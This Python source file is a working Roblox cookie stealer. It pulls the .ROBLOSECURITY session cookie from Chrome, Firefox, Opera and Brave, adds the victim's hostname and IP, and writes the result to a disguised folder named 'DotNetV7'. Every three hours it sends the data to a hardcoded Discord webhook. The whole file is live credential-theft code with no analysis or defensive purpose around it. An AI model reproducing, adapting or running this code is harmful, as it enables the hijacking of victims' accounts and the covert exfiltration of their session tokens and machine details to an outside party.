import browser_cookie3
import socket
import time
import os
from discord_webhook import DiscordWebhook

hostname=socket.gethostname()   # Get Hostname of PC (For Logging)
IPAddr=socket.gethostbyname(hostname) # Get IP of PC (For Logging)
user = os.getlogin()# get username of PC


discordWebhook=str("https://discord.com/api/webhooks/1063615699760713768/nxosUxZi-XxvD3oH97BKB3lQbF5li6A6oVbqXrut-pyyQRZr_FTSXKFqVAbYlkMkHZYo")
cache_path=str(f"C:\\Users\\{user}\\Documents\\DotNetV7") # Where to store file to send/Cache
cache_filename=str("log.txt")

class dumpCookies:
    def chrome():
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
        except:
            return str(f"chrome:nan")
    def firefox():
        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
        except:
            return str(f"firefox:nan")
    def opera():
        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
        except:
            return str(f"opera:nan")
    def brave():
        try:
            cookies = browser_cookie3.brave(domain_name='roblox.com')
            cookies = str(cookies)
            cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            return cookie
        except:
            return str(f"brave:nan")

class install_cache():
    def install_windows():
        isExist = os.path.exists(cache_path)
        if not isExist:
            os.makedirs(cache_path)
            with open(f'{cache_path}\\{cache_filename}', 'w') as f:
                f.write("")
        with open(f'{cache_path}\\{cache_filename}', 'w') as f:
            f.write("")

class exec_src():
    def webhook(content):
        with open(f"{cache_path}\\{cache_filename}", "w") as f:
            f.write(f"{content}")
        constructed_data=str(f"""
```
IP:{IPAddr}
Hostname:{hostname}
```
        """)
        webhook = DiscordWebhook(url=str(discordWebhook),
        content=str(constructed_data),
        rate_limit_retry=True,
        username=f"Webhook with Files"
        )
        with open(f"{cache_path}\\{cache_filename}", "r") as f:
            webhook.add_file(file=f.read(), filename=f"log.txt")
        response = webhook.execute()
    def exec():
        while True:
            install_cache.install_windows()
            chrome_rbx=dumpCookies.chrome()
            firefox_rbx=dumpCookies.firefox()
            opera_rbx=dumpCookies.opera()
            brave_rbx=dumpCookies.brave()
            content=str(f"""
IP:{IPAddr}
Hostname:{hostname}

Chrome:Roblox.com->
{chrome_rbx}

Firefox:Roblox.com->
{firefox_rbx}

Opera:Roblox.com->
{opera_rbx}

Brave:Roblox.com->
{brave_rbx}
            """)
            exec_src.webhook(content=content)
            time.sleep(10800) # Update every 3 hour

if __name__=="__main__":
    exec_src.exec()